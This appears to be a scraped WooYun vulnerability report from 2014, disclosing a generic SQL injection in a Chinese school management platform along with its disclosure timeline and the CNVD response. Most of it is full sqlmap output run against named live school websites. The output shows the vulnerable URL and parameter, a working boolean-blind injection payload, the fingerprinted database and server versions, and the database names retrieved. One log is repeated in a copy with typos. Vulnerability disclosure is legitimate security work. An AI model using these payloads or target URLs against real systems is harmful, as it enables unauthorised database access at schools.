{"id": 52763, "wybug_id": "wooyun-2014-070238", "wybug_title": "释锐教育校校用平台通用SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Mosuan", "wybug_date": "2014-08-01 12:23", "wybug_open_date": "2014-10-30 12:24", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向公众公开  简要描述： rt释锐是全国领先的智慧教育解决方案供应商。致力于通过技术创新为中小学、职校、高校和教育行政管理机构提供有竞争力的智慧教育解决方案和服务，持续提升客户体验，为客户创造最大价值。目前，释锐的产品和解决方案已经应用于 25 个省市，服务全国 3000 多所学校。##据说通用性有奖励，不知道这个算不算... 详细说明：   WooYun: 释锐教育校校用平台通用SQL注入漏洞 看大牛的漏洞然后买车买房娶媳妇我也发三个行吗？测试了上海释锐教育软件有限公司客户中的三个案例，证明确实为通用型SQL注入漏洞！\n注入地址:http://www.hshsh.pudong-edu.sh.cn/be/ber_upload_rank.jsp?direction=0    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 03:49:14[03:49:14] [INFO] using 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.hshsh.pudong-edu.sh.cn\\session' as session file[03:49:14] [INFO] testing connection to the target url[03:49:15] [INFO] testing if the url is stable, wait a few seconds[03:49:18] [INFO] url is stable[03:49:18] [INFO] testing if GET parameter 'direction' is dynamic[03:49:18] [INFO] confirming that GET parameter 'direction' is dynamic[03:49:19] [INFO] GET parameter 'direction' is dynamic[03:49:20] [WARNING] heuristic test shows that GET parameter 'direction' might not be injectable[03:49:20] [INFO] testing sql injection on GET parameter 'direction'[03:49:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[03:49:21] [INFO] GET parameter 'direction' is 'AND boolean-based blind - WHEREor HAVING clause' injectable[03:49:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[03:49:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[03:49:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[03:49:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[03:49:23] [INFO] testing 'MySQL > 5.0.11 stacked queries'[03:49:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[03:49:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[03:49:24] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[03:49:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[03:49:25] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[03:49:26] [INFO] testing 'Oracle AND time-based blind'[03:49:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[03:49:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[03:49:31] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using the --dbms option[03:49:35] [INFO] checking if the injection point on GET parameter 'direction' is a false positiveGET parameter 'direction' is vulnerable. Do you want to keep testing the others(if any)? [y/N] ysqlmap identified the following injection points with a total of 40 HTTP(s) requests:---Place: GETParameter: direction    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: direction=0) AND 2779=2779 AND (4083=4083---[03:50:25] [INFO] testing MySQL[03:50:25] [WARNING] the back-end DBMS is not MySQL[03:50:25] [INFO] testing Oracle[03:50:26] [WARNING] the back-end DBMS is not Oracle[03:50:26] [INFO] testing PostgreSQL[03:50:26] [WARNING] the back-end DBMS is not PostgreSQL[03:50:26] [INFO] testing Microsoft SQL Server[03:50:28] [INFO] confirming Microsoft SQL Server[03:50:31] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: Tomcat 4.0.5., Servlet 2.4, JSPback-end DBMS: Microsoft SQL Server 2005[03:50:31] [INFO] fetching database names[03:50:31] [INFO] fetching number of databases[03:50:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[03:50:31] [INFO] retrieved: 5[03:50:37] [INFO] retrieved:[03:50:40] [INFO] retrieved:[03:50:43] [INFO] retrieved:[03:50:46] [INFO] retrieved:[03:50:49] [INFO] retrieved:[03:50:52] [INFO] falling back to current database[03:50:52] [INFO] fetching current database[03:50:52] [INFO] retrieved: xiaoxiaoyong_schoolavailable databases [1]:[*] xiaoxiaoyong_school[03:53:01] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.hshsh.pudong-edu.sh.cn'[*] shutting down at 03:53:01\n\n注入地址:http://www.hshsh.pudong-edu.sh.cn/be/ber_upload_rank.jsp?direction=0    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutua consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsile for any misuse or damage caused by this program[*] starting at 03:49:14[03:49:14] [INFO] using 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.hshsh.pudong-edu.sh.cn\\session' as session file[03:49:14] [INFO] testing connection to the target url[03:49:15] [INFO] testing if the url is stable, wait a few seconds[03:49:18] [INFO] url is stable[03:49:18] [INFO] testing if GET parameter 'direction' is dynamic[03:49:18] [INFO] confirming that GET parameter 'direction' is dynamic[03:49:19] [INFO] GET parameter 'direction' is dynamic[03:49:20] [WARNING] heuristic test shows that GET parameter 'direction' mightot be injectable[03:49:20] [INFO] testing sql injection on GET parameter 'direction'[03:49:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[03:49:21] [INFO] GET parameter 'direction' is 'AND boolean-based blind - WHEREor HAVING clause' injectable[03:49:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING claus'[03:49:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[03:49:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHEREr HAVING clause'[03:49:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLype)'[03:49:23] [INFO] testing 'MySQL > 5.0.11 stacked queries'[03:49:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[03:49:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[03:49:24] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[03:49:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[03:49:25] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[03:49:26] [INFO] testing 'Oracle AND time-based blind'[03:49:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[03:49:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[03:49:31] [WARNING] using unescaped version of the test because of zero knowlege of the back-end DBMS. You can try to explicitly set it using the --dbms optin[03:49:35] [INFO] checking if the injection point on GET parameter 'direction's a false positiveGET parameter 'direction' is vulnerable. Do you want to keep testing the others(if any)? [y/N] ysqlmap identified the following injection points with a total of 40 HTTP(s) reqests:---Place: GETParameter: direction    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: direction=0) AND 2779=2779 AND (4083=4083---[03:50:25] [INFO] testing MySQL[03:50:25] [WARNING] the back-end DBMS is not MySQL[03:50:25] [INFO] testing Oracle[03:50:26] [WARNING] the back-end DBMS is not Oracle[03:50:26] [INFO] testing PostgreSQL[03:50:26] [WARNING] the back-end DBMS is not PostgreSQL[03:50:26] [INFO] testing Microsoft SQL Server[03:50:28] [INFO] confirming Microsoft SQL Server[03:50:31] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: Tomcat 4.0.5., Servlet 2.4, JSPback-end DBMS: Microsoft SQL Server 2005[03:50:31] [INFO] fetching database names[03:50:31] [INFO] fetching number of databases[03:50:31] [WARNING] running in a single-thread mode. Please consider usage ofption '--threads' for faster data retrieval[03:50:31] [INFO] retrieved: 5[03:50:37] [INFO] retrieved:[03:50:40] [INFO] retrieved:[03:50:43] [INFO] retrieved:[03:50:46] [INFO] retrieved:[03:50:49] [INFO] retrieved:[03:50:52] [INFO] falling back to current database[03:50:52] [INFO] fetching current database[03:50:52] [INFO] retrieved: xiaoxiaoyong_schoolavailable databases [1]:[*] xiaoxiaoyong_school[03:53:01] [INFO] Fetched data logged to text files under 'C:\\Users\\Administratr\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.hshsh.pudong-edu.sh.cn'[*] shutting down at 03:53:01\n\n注入地址:http://xhzx3.xhedu.sh.cn:8003/be/ber_upload_rank.jsp?direction=0    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 03:54:43[03:54:44] [INFO] using 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\xhzx3.xhedu.sh.cn\\session' as session file[03:54:44] [INFO] testing connection to the target url[03:54:46] [INFO] testing if the url is stable, wait a few seconds[03:54:49] [INFO] url is stable[03:54:49] [INFO] testing if GET parameter 'direction' is dynamic[03:54:49] [INFO] confirming that GET parameter 'direction' is dynamic[03:54:50] [INFO] GET parameter 'direction' is dynamic[03:54:50] [WARNING] heuristic test shows that GET parameter 'direction' might not be injectable[03:54:50] [INFO] testing sql injection on GET parameter 'direction'[03:54:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[03:54:53] [INFO] GET parameter 'direction' is 'AND boolean-based blind - WHEREor HAVING clause' injectable[03:54:53] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[03:54:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[03:54:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[03:54:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[03:54:55] [INFO] testing 'MySQL > 5.0.11 stacked queries'[03:54:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[03:54:55] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[03:54:56] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[03:54:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[03:54:57] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[03:54:57] [INFO] testing 'Oracle AND time-based blind'[03:54:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[03:55:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[03:55:03] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using the --dbms option[03:55:07] [INFO] checking if the injection point on GET parameter 'direction' is a false positiveGET parameter 'direction' is vulnerable. Do you want to keep testing the others(if any)? [y/N] ysqlmap identified the following injection points with a total of 40 HTTP(s) requests:---Place: GETParameter: direction    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: direction=0) AND 5637=5637 AND (5862=5862---[03:56:39] [INFO] testing MySQL[03:56:40] [WARNING] the back-end DBMS is not MySQL[03:56:40] [INFO] testing Oracle[03:56:40] [WARNING] the back-end DBMS is not Oracle[03:56:40] [INFO] testing PostgreSQL[03:56:41] [WARNING] the back-end DBMS is not PostgreSQL[03:56:41] [INFO] testing Microsoft SQL Server[03:56:43] [INFO] confirming Microsoft SQL Server[03:56:48] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: Tomcat 5.0.28, Servlet 2.4, JSPback-end DBMS: Microsoft SQL Server 2005[03:56:48] [INFO] fetching database names[03:56:48] [INFO] fetching number of databases[03:56:48] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[03:56:48] [INFO] retrieved: 5[03:56:55] [INFO] retrieved:[03:56:58] [INFO] retrieved:[03:57:02] [INFO] retrieved:[03:57:05] [INFO] retrieved:[03:57:08] [INFO] retrieved:[03:57:12] [INFO] falling back to current database[03:57:12] [INFO] fetching current database[03:57:12] [INFO] retrieved: pubsavailable databases [1]:[*] pubs[03:57:55] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\xhzx3.xhedu.sh.cn'[*] shutting down at 03:57:55\n   漏洞证明：  详细说明   修复方案：  过滤   版权声明：转载请注明来源 Mosuan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-08-06 08:31 厂商回复： CNVD确认所述情况，由CNVD后续联系软件生产厂商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}